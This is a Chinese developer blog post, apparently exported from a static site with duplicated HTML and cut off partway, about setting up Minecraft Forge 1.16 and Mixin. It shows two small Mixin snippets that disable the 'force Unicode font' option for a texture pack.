（我知道有很多1.12的环境搭建教程，但1.16版本的forge教程简直是一片荒原\n>\n> 而由于网络原因（众所周知），老外的那套官方教程很多地方对我们不适用\n>\n> 庆幸我最开始学习的是Bukkit开发，如果当时我选择学习forge mod开发，多半会倒在环境搭建这座大山前\n\n最开始我试图使用forge官方提供的ForgeGradle mdk快速完成开发环境的搭建，最后我发现即使我能够科学上网，有的东西gradle一样拉不下来\n\n怎么办？于是我上mcbbs寻求帮助，发现了耗子大佬的[[1.17.1-1.7.10\\] Minecraft模组开发离线包 [Forge|Fabric] - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)](https://www.mcbbs.net/thread-896542-1-1.html)于是我下载并部署了耗子大佬的gradle依赖离线包。\n\n到这里我便具备了一个Forge开发者的基本开发环境\n\n但如果仅仅到这里就结束，我也不会说他难了\n\n真正的重头戏，还在后头\n\n## Mixin环境搭建\n\n> Mixin是SpongePowered开发的一套基于javaagent和asm框架的字节码操作框架，有了Mixin，开发者可以摆脱繁琐的传统字节码插桩操作，以一种非常简洁直观的方式修改Minecraft客户端的底层逻辑代码\n>\n> 而不同于Bukkit API竭力阻止开发者利用服务端原生特性，主张一切插件应该完全在Bukkit API的基础上实现\n>\n> Forge API的设计是完全信任开发者的，鼓励开发者修改客户端底层逻辑代码来实现自己想要的特性，甚至Forge准确来说不能被称为一种API，而是模组开发者与客户端底层代码的一层兼容层。\n>\n> 所以说，Forge和Mixin可谓是天作之合，从Forge1.16版本开始，Forge开始原生附带Mixin环境\n>\n> 而这一切，得益于Mojang官方公布了客户端的混淆表。Minecraft作为一款商业游戏，公布混淆表无疑是一种巨大的牺牲。但我相信，正是这个英明的决策，刺激了广大模组开发者的开发热情，让各色Minecraft模组在社区中遍地生根，让Minecraft成为如此一款伟大的游戏。\n>\n> 所以在Forge开发中，我们看到的大部分客户端底层代码都是具有相当程度的可读性的。\n>\n> 而使用Mixin，可以让我们以最高效的方式修改底层代码，实现一些以前在做Bukkit开发时连想都不敢想的魔法般的特性\n>\n> 那么Mixin的环境搭建，上面我说的重头戏\n\n最开始我以为Mixin是不需要配置，开箱即用的。结果把编译出来的模组跑了一遍又一遍，发现Mixin没有起任何作用\n\n我尝试在网络上搜索Mixin环境搭建教程，却发现除了耗子大佬的[[未知之域\\][翻译]Mixin官方文档翻译——深度修改Minecraft的利器 - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)](https://www.mcbbs.net/thread-833646-1-1.html)，一篇有价值的文章也找不出来。\n\n我在耗子大佬的官方文档翻译中学习了Mixin的使用方法，但它并没有详细的告诉我如何搭建环境。\n\n于是我想起来，坏黑曾经写过一个1.16的Forge Mod，我是不是可以参考他的源码来招猫画虎呢\n\n同时我也想起来海螺的博客似乎也提到过这玩意，然后在这上面找到了官方的release note\n\n[关于 Mixin 升级到 0.8 和 ModLauncher 的那些事 | IzzelAliz's Blog](https://izzel.io/2020/02/06/mixin-0-8-guide/)\n\n[Release Notes Mixin 0.8 · SpongePowered/Mixin Wiki (github.com)](https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8)\n\n于是依靠上面这些，我基本搭建起了一个Mixin环境\n\n> 难点基本如下\n>\n> 1.MixinConnector\n>\n> 2.MixinRefmap文件\n>\n> 3.MixinAnnoationProcessor\n>\n> 4.Mixin配置文件\n>\n> 额外需要注意的是，Mixin配置文件中指定的Mixin Pakage不能指定位模组主类所在包，这样会导致模组无法加载\n\n虽然有些晚了，但我还是把问题解决之后找到的相关资料放在这里\n\n[mouse0w0/forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)](https://github.com/mouse0w0/forge-mixin-example)\n\n## 功能实现\n\n毕竟也不是教程，杂谈而已，就不写使用教程了\n\n这里只放出实现功能的Mixin代码\n\n### 我的做法\n\n锁掉底层选项实际boolean值，使玩家不论如何更改选项都以非强制Unicode字体方式渲染字体\n\n~~~java\n\npackage me.asgard.rain.afu.mixin;\n\nimport com.google.common.collect.ImmutableMap;\nimport net.minecraft.client.Minecraft;\nimport net.minecraft.client.gui.fonts.FontResourceManager;\nimport org.spongepowered.asm.mixin.Final;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.Overwrite;\nimport org.spongepowered.asm.mixin.Shadow;\n\nimport java.io.IOException;\n\n/**\n * me.asgard.rain.afu.GameSettingMixin\n * AntiForceUnicode\n *\n * @author 寒雨\n * @since 2021/12/29 13:48\n **/\n@Mixin(Minecraft.class)\npublic abstract class MinecraftMixin {\n\n    @Final\n    @Shadow\n    private FontResourceManager fontManager;\n\n    /**\n     * @author Rain\n     * @reason force disable force unicode\n     */\n    @Overwrite\n    public boolean isEnforceUnicode() {\n        return false;\n    }\n\n    /**\n     * @author Rain\n     * @reason force disable force unicode\n     */\n    @Overwrite\n    public void selectMainFont(boolean p_238209_1_) {\n        fontManager.setRenames(ImmutableMap.of());\n    }\n}\n~~~\n\n### 坏黑的做法\n\n写成一天后坏黑大概是来兴趣了，也写了一个\n\n他直接把那个选项的按钮删掉了。毫无疑问，这个做法更好\n\n~~~java\npackage me.skymc.fsb.mixin;\n\nimport net.minecraft.client.AbstractOption;\nimport net.minecraft.client.gui.screen.Screen;\nimport net.minecraft.client.gui.widget.Widget;\nimport net.minecraft.client.gui.widget.button.OptionButton;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.injection.At;\nimport org.spongepowered.asm.mixin.injection.Inject;\nimport org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;\n\n/**\n * FSB\n * me.skymc.fsb.mixin.MixinScreenLanguage\n *\n * @author 坏黑\n * @since 2021/12/29 10:54 PM\n */\n@Mixin(Screen.class)\npublic abstract class MixinLanguageScreen {\n\n    @Inject(method = \"addButton\", at = @At(value = \"HEAD\"), cancellable = true)\n    protected <T extends Widget> void addButton(T p_230480_1_, CallbackInfoReturnable<T> c) {\n        if (p_230480_1_ instanceof OptionButton && ((OptionButton) p_230480_1_).getOption() == AbstractOption.FORCE_UNICODE_FONT) {\n            c.setReturnValue(p_230480_1_);\n        }\n    }\n}\n~~~","slug":"hello-forge-and-mixin","published":1,"updated":"2022-11-24T02:59:14.239Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jth0016sfklgu2uh9hd","content":"<h1 id=\"Hello-Minecraft-Forge-amp-Mixin\"><a href=\"#Hello-Minecraft-Forge-amp-Mixin\" class=\"headerlink\" title=\"Hello Minecraft Forge &amp; Mixin!\"></a>Hello Minecraft Forge &amp; Mixin!</h1><blockquote>\n<p>起因经过大概是斯帕克那边需要一个模组来禁止玩家开启 强制使用Unicode字体 这一选项来确保材质包的体验效果</p>\n<p>行吧，以前虽然完全没有了解过Forge开发，还是只有硬着头皮上了呗</p>\n</blockquote>\n<h2 id=\"Forge环境搭建\"><a href=\"#Forge环境搭建\" class=\"headerlink\" title=\"Forge环境搭建\"></a>Forge环境搭建</h2><blockquote>\n<p>老大难了，Forge Mod的开发者之所以明显少于Bukkit插件开发者也许就是因为这位拦路虎吧</p>\n<p>不仅难，社区的有关教程也特别少 （我知道有很多1.12的环境搭建教程，但1.16版本的forge教程简直是一片荒原</p>\n<p>而由于网络原因（众所周知），老外的那套官方教程很多地方对我们不适用</p>\n<p>庆幸我最开始学习的是Bukkit开发，如果当时我选择学习forge mod开发，多半会倒在环境搭建这座大山前</p>\n</blockquote>\n<p>最开始我试图使用forge官方提供的ForgeGradle mdk快速完成开发环境的搭建，最后我发现即使我能够科学上网，有的东西gradle一样拉不下来</p>\n<p>怎么办？于是我上mcbbs寻求帮助，发现了耗子大佬的[<a href=\"https://www.mcbbs.net/thread-896542-1-1.html\">1.17.1-1.7.10] Minecraft模组开发离线包 [Forge|Fabric] - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)</a>于是我下载并部署了耗子大佬的gradle依赖离线包。</p>\n<p>到这里我便具备了一个Forge开发者的基本开发环境</p>\n<p>但如果仅仅到这里就结束，我也不会说他难了</p>\n<p>真正的重头戏，还在后头</p>\n<h2 id=\"Mixin环境搭建\"><a href=\"#Mixin环境搭建\" class=\"headerlink\" title=\"Mixin环境搭建\"></a>Mixin环境搭建</h2><blockquote>\n<p>Mixin是SpongePowered开发的一套基于javaagent和asm框架的字节码操作框架，有了Mixin，开发者可以摆脱繁琐的传统字节码插桩操作，以一种非常简洁直观的方式修改Minecraft客户端的底层逻辑代码</p>\n<p>而不同于Bukkit API竭力阻止开发者利用服务端原生特性，主张一切插件应该完全在Bukkit API的基础上实现</p>\n<p>Forge API的设计是完全信任开发者的，鼓励开发者修改客户端底层逻辑代码来实现自己想要的特性，甚至Forge准确来说不能被称为一种API，而是模组开发者与客户端底层代码的一层兼容层。</p>\n<p>所以说，Forge和Mixin可谓是天作之合，从Forge1.16版本开始，Forge开始原生附带Mixin环境</p>\n<p>而这一切，得益于Mojang官方公布了客户端的混淆表。Minecraft作为一款商业游戏，公布混淆表无疑是一种巨大的牺牲。但我相信，正是这个英明的决策，刺激了广大模组开发者的开发热情，让各色Minecraft模组在社区中遍地生根，让Minecraft成为如此一款伟大的游戏。</p>\n<p>所以在Forge开发中，我们看到的大部分客户端底层代码都是具有相当程度的可读性的。</p>\n<p>而使用Mixin，可以让我们以最高效的方式修改底层代码，实现一些以前在做Bukkit开发时连想都不敢想的魔法般的特性</p>\n<p>那么Mixin的环境搭建，上面我说的重头戏</p>\n</blockquote>\n<p>最开始我以为Mixin是不需要配置，开箱即用的。结果把编译出来的模组跑了一遍又一遍，发现Mixin没有起任何作用</p>\n<p>我尝试在网络上搜索Mixin环境搭建教程，却发现除了耗子大佬的[<a href=\"https://www.mcbbs.net/thread-833646-1-1.html\">未知之域][翻译]Mixin官方文档翻译——深度修改Minecraft的利器 - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)</a>，一篇有价值的文章也找不出来。</p>\n<p>我在耗子大佬的官方文档翻译中学习了Mixin的使用方法，但它并没有详细的告诉我如何搭建环境。</p>\n<p>于是我想起来，坏黑曾经写过一个1.16的Forge Mod，我是不是可以参考他的源码来招猫画虎呢</p>\n<p>同时我也想起来海螺的博客似乎也提到过这玩意，然后在这上面找到了官方的release note</p>\n<p><a href=\"https://izzel.io/2020/02/06/mixin-0-8-guide/\">关于 Mixin 升级到 0.8 和 ModLauncher 的那些事 | IzzelAliz’s Blog</a></p>\n<p><a href=\"https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8\">Release Notes Mixin 0.8 · SpongePowered/Mixin Wiki (github.com)</a></p>\n<p>于是依靠上面这些，我基本搭建起了一个Mixin环境</p>\n<blockquote>\n<p>难点基本如下</p>\n<p>1.MixinConnector</p>\n<p>2.MixinRefmap文件</p>\n<p>3.MixinAnnoationProcessor</p>\n<p>4.Mixin配置文件</p>\n<p>额外需要注意的是，Mixin配置文件中指定的Mixin Pakage不能指定位模组主类所在包，这样会导致模组无法加载</p>\n</blockquote>\n<p>虽然有些晚了，但我还是把问题解决之后找到的相关资料放在这里</p>\n<p><a href=\"https://github.com/mouse0w0/forge-mixin-example\">mouse0w0/forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)</a></p>\n<h2 id=\"功能实现\"><a href=\"#功能实现\" class=\"headerlink\" title=\"功能实现\"></a>功能实现</h2><p>毕竟也不是教程，杂谈而已，就不写使用教程了</p>\n<p>这里只放出实现功能的Mixin代码</p>\n<h3 id=\"我的做法\"><a href=\"#我的做法\" class=\"headerlink\" title=\"我的做法\"></a>我的做法</h3><p>锁掉底层选项实际boolean值，使玩家不论如何更改选项都以非强制Unicode字体方式渲染字体</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\n<span class=\"token keyword\">package</span> <span class=\"token namespace\">me<span class=\"token punctuation\">.</span>asgard<span class=\"token punctuation\">.</span>rain<span class=\"token punctuation\">.</span>afu<span class=\"token punctuation\">.</span>mixin</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span>collect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ImmutableMap</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Minecraft</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>fonts<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FontResourceManager</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Final</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Mixin</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Overwrite</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Shadow</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * me.asgard.rain.afu.GameSettingMixin\n * AntiForceUnicode\n *\n * @author 寒雨\n * @since 2021/12/29 13:48\n **/</span>\n<span class=\"token annotation punctuation\">@Mixin</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Minecraft</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MinecraftMixin</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation punctuation\">@Final</span>\n    <span class=\"token annotation punctuation\">@Shadow</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">FontResourceManager</span> fontManager<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @author Rain\n     * @reason force disable force unicode\n     */</span>\n    <span class=\"token annotation punctuation\">@Overwrite</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isEnforceUnicode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @author Rain\n     * @reason force disable force unicode\n     */</span>\n    <span class=\"token annotation punctuation\">@Overwrite</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">selectMainFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> p_238209_1_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        fontManager<span class=\"token punctuation\">.</span><span class=\"token function\">setRenames</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ImmutableMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">of</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"坏黑的做法\"><a href=\"#坏黑的做法\" class=\"headerlink\" title=\"坏黑的做法\"></a>坏黑的做法</h3><p>写成一天后坏黑大概是来兴趣了，也写了一个</p>\n<p>他直接把那个选项的按钮删掉了。毫无疑问，这个做法更好</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">me<span class=\"token punctuation\">.</span>skymc<span class=\"token punctuation\">.</span>fsb<span class=\"token punctuation\">.</span>mixin</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AbstractOption</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>screen<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Screen</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Widget</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span>button<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OptionButton</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Mixin</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">At</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Inject</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span>callback<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CallbackInfoReturnable</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * FSB\n * me.skymc.fsb.mixin.MixinScreenLanguage\n *\n * @author 坏黑\n * @since 2021/12/29 10:54 PM\n */</span>\n<span class=\"token annotation punctuation\">@Mixin</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Screen</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MixinLanguageScreen</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation punctuation\">@Inject</span><span class=\"token punctuation\">(</span>method <span class=\"token operator\">=</span> <span class=\"token string\">\"addButton\"</span><span class=\"token punctuation\">,</span> at <span class=\"token operator\">=</span> <span class=\"token annotation punctuation\">@At</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"HEAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> cancellable <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Widget</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token keyword\">void</span> <span class=\"token function\">addButton</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> p_230480_1_<span class=\"token punctuation\">,</span> <span class=\"token class-name\">CallbackInfoReturnable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">&gt;</span></span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p_230480_1_ <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">OptionButton</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OptionButton</span><span class=\"token punctuation\">)</span> p_230480_1_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getOption</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">AbstractOption</span><span class=\"token punctuation\">.</span>FORCE_UNICODE_FONT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            c<span class=\"token punctuation\">.</span><span class=\"token function\">setReturnValue</span><span class=\"token punctuation\">(</span>p_230480_1_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Hello-Minecraft-Forge-amp-Mixin\"><a href=\"#Hello-Minecraft-Forge-amp-Mixin\" class=\"headerlink\" title=\"Hello Minecraft Forge &amp; Mixin!\"></a>Hello Minecraft Forge &amp; Mixin!</h1><blockquote>\n<p>起因经过大概是斯帕克那边需要一个模组来禁止玩家开启 强制使用Unicode字体 这一选项来确保材质包的体验效果</p>\n<p>行吧，以前虽然完全没有了解过Forge开发，还是只有硬着头皮上了呗</p>\n</blockquote>\n<h2 id=\"Forge环境搭建\"><a href=\"#Forge环境搭建\" class=\"headerlink\" title=\"Forge环境搭建\"></a>Forge环境搭建</h2><blockquote>\n<p>老大难了，Forge Mod的开发者之所以明显少于Bukkit插件开发者也许就是因为这位拦路虎吧</p>\n<p>不仅难，社区的有关教程也特别少 （我知道有很多1.12的环境搭建教程，但1.16版本的forge教程简直是一片荒原</p>\n<p>而由于网络原因（众所周知），老外的那套官方教程很多地方对我们不适用</p>\n<p>庆幸我最开始学习的是Bukkit开发，如果当时我选择学习forge mod开发，多半会倒在环境搭建这座大山前</p>\n</blockquote>\n<p>最开始我试图使用forge官方提供的ForgeGradle mdk快速完成开发环境的搭建，最后我发现即使我能够科学上网，有的东西gradle一样拉不下来</p>\n<p>怎么办？于是我上mcbbs寻求帮助，发现了耗子大佬的[<a href=\"https://www.mcbbs.net/thread-896542-1-1.html\">1.17.1-1.7.10] Minecraft模组开发离线包 [Forge|Fabric] - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)</a>于是我下载并部署了耗子大佬的gradle依赖离线包。</p>\n<p>到这里我便具备了一个Forge开发者的基本开发环境</p>\n<p>但如果仅仅到这里就结束，我也不会说他难了</p>\n<p>真正的重头戏，还在后头</p>\n<h2 id=\"Mixin环境搭建\"><a href=\"#Mixin环境搭建\" class=\"headerlink\" title=\"Mixin环境搭建\"></a>Mixin环境搭建</h2><blockquote>\n<p>Mixin是SpongePowered开发的一套基于javaagent和asm框架的字节码操作框架，有了Mixin，开发者可以摆脱繁琐的传统字节码插桩操作，以一种非常简洁直观的方式修改Minecraft客户端的底层逻辑代码</p>\n<p>而不同于Bukkit API竭力阻止开发者利用服务端原生特性，主张一切插件应该完全在Bukkit API的基础上实现</p>\n<p>Forge API的设计是完全信任开发者的，鼓励开发者修改客户端底层逻辑代码来实现自己想要的特性，甚至Forge准确来说不能被称为一种API，而是模组开发者与客户端底层代码的一层兼容层。</p>\n<p>所以说，Forge和Mixin可谓是天作之合，从Forge1.16版本开始，Forge开始原生附带Mixin环境</p>\n<p>而这一切，得益于Mojang官方公布了客户端的混淆表。Minecraft作为一款商业游戏，公布混淆表无疑是一种巨大的牺牲。但我相信，正是这个英明的决策，刺激了广大模组开发者的开发热情，让各色Minecraft模组在社区中遍地生根，让Minecraft成为如此一款伟大的游戏。</p>\n<p>所以在Forge开发中，我们看到的大部分客户端底层代码都是具有相当程度的可读性的。</p>\n<p>而使用Mixin，可以让我们以最高效的方式修改底层代码，实现一些以前在做Bukkit开发时连想都不敢想的魔法般的特性</p>\n<p>那么Mixin的环境搭建，上面我说的重头戏</p>\n</blockquote>\n<p>最开始我以为Mixin是不需要配置，开箱即用的。结果把编译出来的模组跑了一遍又一遍，发现Mixin没有起任何作用</p>\n<p>我尝试在网络上搜索Mixin环境搭建教程，却发现除了耗子大佬的[<a href=\"https://www.mcbbs.net/thread-833646-1-1.html\">未知之域][翻译]Mixin官方文档翻译——深度修改Minecraft的利器 - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)</a>，一篇有价值的文章也找不出来。</p>\n<p>我在耗子大佬的官方文档翻译中学习了Mixin的使用方法，但它并没有详细的告诉我如何搭建环境。</p>\n<p>于是我想起来，坏黑曾经写过一个1.16的Forge Mod，我是不是可以参考他的源码来招猫画虎呢</p>\n<p>同时我也想起来海螺的博客似乎也提到过这玩意，然后在这上面找到了官方的release note</p>\n<p><a href=\"https://izzel.io/2020/02/06/mixin-0-8-guide/\">关于 Mixin 升级到 0.8 和 ModLauncher 的那些事 | IzzelAliz’s Blog</a></p>\n<p><a href=\"https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8\">Release Notes Mixin 0.8 · SpongePowered&#x2F;Mixin Wiki (github.com)</a></p>\n<p>于是依靠上面这些，我基本搭建起了一个Mixin环境</p>\n<blockquote>\n<p>难点基本如下</p>\n<p>1.MixinConnector</p>\n<p>2.MixinRefmap文件</p>\n<p>3.MixinAnnoationProcessor</p>\n<p>4.Mixin配置文件</p>\n<p>额外需要注意的是，Mixin配置文件中指定的Mixin Pakage不能指定位模组主类所在包，这样会导致模组无法加载</p>\n</blockquote>\n<p>虽然有些晚了，但我还是把问题解决之后找到的相关资料放在这里</p>\n<p><a href=\"https://github.com/mouse0w0/forge-mixin-example\">mouse0w0&#x2F;forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)</a></p>\n<h2 id=\"功能实现\"><a href=\"#功能实现\" class=\"headerlink\" title=\"功能实现\"></a>功能实现</h2><p>毕竟也不是教程，杂谈而已，就不写使用教程了</p>\n<p>这里只放出实现功能的Mixin代码</p>\n<h3 id=\"我的做法\"><a href=\"#我的做法\" class=\"headerlink\" title=\"我的做法\"></a>我的做法</h3><p>锁掉底层选项实际boolean值，使玩家不论如何更改选项都以非强制Unicode字体方式渲染字体</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\n<span class=\"token keyword\">package</span> <span class=\"token namespace\">me<span class=\"token punctuation\">.</span>asgard<span class=\"token punctuation\">.</span>rain<span class=\"token punctuation\">.</span>afu<span class=\"token punctuation\">.</span>mixin</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span>collect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ImmutableMap</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Minecraft</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token 